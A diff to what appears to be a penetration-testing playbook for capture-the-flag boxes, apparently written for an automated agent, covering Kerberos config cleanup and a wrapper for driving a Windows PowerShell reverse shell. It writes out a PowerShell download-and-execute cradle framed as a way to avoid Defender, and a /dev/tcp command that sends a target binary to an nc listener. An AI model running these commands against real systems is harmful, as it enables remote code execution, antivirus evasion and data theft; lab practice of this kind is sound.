@@ -36,6 +36,9 @@ silently mis-resolves this box's domain/realm - impacket Kerberos then hangs on 
 (which take an explicit IP) look fine, a confusing time-sink. Before recon, review and prune stale lines:
 `bash /root/vm.sh 'grep -vE "^#|^127\.|^::1|^$" /etc/hosts'` - delete any line whose IP is NOT this box, then
 add only this target. (A shared realm like `thm.local`/`htb` across boxes is the classic trap.)
+**Also prune `/etc/krb5.conf`** the same way: a stale `default_realm` from a prior box makes Kerberos-first
+tools (xfreerdp NLA, impacket) waste time failing to reach a dead KDC before falling back to NTLM
+(`bash /root/vm.sh 'grep -i default_realm /etc/krb5.conf'`; blank it or set this box's realm). Same stale-state trap as `/etc/hosts`.
 
 Tooling-first: use rustscan/nmap/feroxbuster/ffuf/nuclei/nxc - never hand-roll a /dev/tcp port loop or a curl fuzz loop (weaker, skips the fingerprint router). **feroxbuster is the DEFAULT web content-discovery tool** (recursive, faster, finds nested paths ffuf/big.txt miss) - launch it the moment nmap shows a web port; keep ffuf for param-mining + vhosts.
 
@@ -252,6 +255,20 @@ Chain: Joomla CVE-2023-23752 (leaks DB pass) -> cred-reuse to root SSH on a pivo
   vm.sh -> ssh -> tmux bridge and returns ONLY the command's output between markers. Hand-driving
   send-keys and losing turns to shell-quoting (nested quotes, failed base64 wrappers) is the recurring
   drift this removes. (Quick throwaway one-liners can still go direct; anything with quotes/pipes uses vm-rsh.)
+- **Windows PowerShell reverse shell -> `bash scripts/win-rsh.sh <eng> '<one ps command>'`** (the PS
+  counterpart; `vm-rsh.sh` decodes with `bash` and only fits a *nix shell). **Follow the shell-interaction
+  discipline (`docs/shell-interaction.md`): ONE command per call, NO injected markers/sentinels/nonce, type
+  it the way an operator would.** win-rsh frames output by the shell's OWN prompt (echoed command + trailing
+  prompt stripped) - it does NOT inject tokens. Type `$env:USERNAME`/`$_` plainly: it escapes `$`/`` ` ``/`"`
+  for the one lossy `bash -c` layer, so the command arrives intact (the VM's `bash -c` eating every `$var` is
+  the worst Windows time-sink, handled for you - do NOT strip `$` to dodge it, and do NOT hand-roll
+  `tmux send-keys`). If output is empty/weird, PROBE with a bare `whoami` (never add instrumentation): a
+  username = alive (the empty result was real); nothing = stuck, stop; a NON-username = the reverse shell
+  DIED and fell back to the ATTACKER prompt (the false-RCE trap: `whoami` returns root/kali, not the target) -
+  win-rsh detects this and refuses to pass off attacker output as the target. For a `$`-heavy or
+  multi-statement script, host a readable `.ps1` and run it in-memory (`IEX(New-Object
+  Net.WebClient).DownloadString('http://<lhost>/enum.ps1')`) - the cradle has no `$`, the script runs
+  on-target, nothing hits disk to trip Defender.
 - **A custom network service (esp. a Go `net/http` server on an odd port) = pull the binary and RE it,
   do not brute the protocol.** Exfil it (`cat /path/bin > /dev/tcp/<lhost>/<port>` to an `nc -lvnp`
   listener), then `GOROOT=$(ls -d /usr/local/go /usr/lib/go-* | head -1) go tool objdump -s main.<fn>`
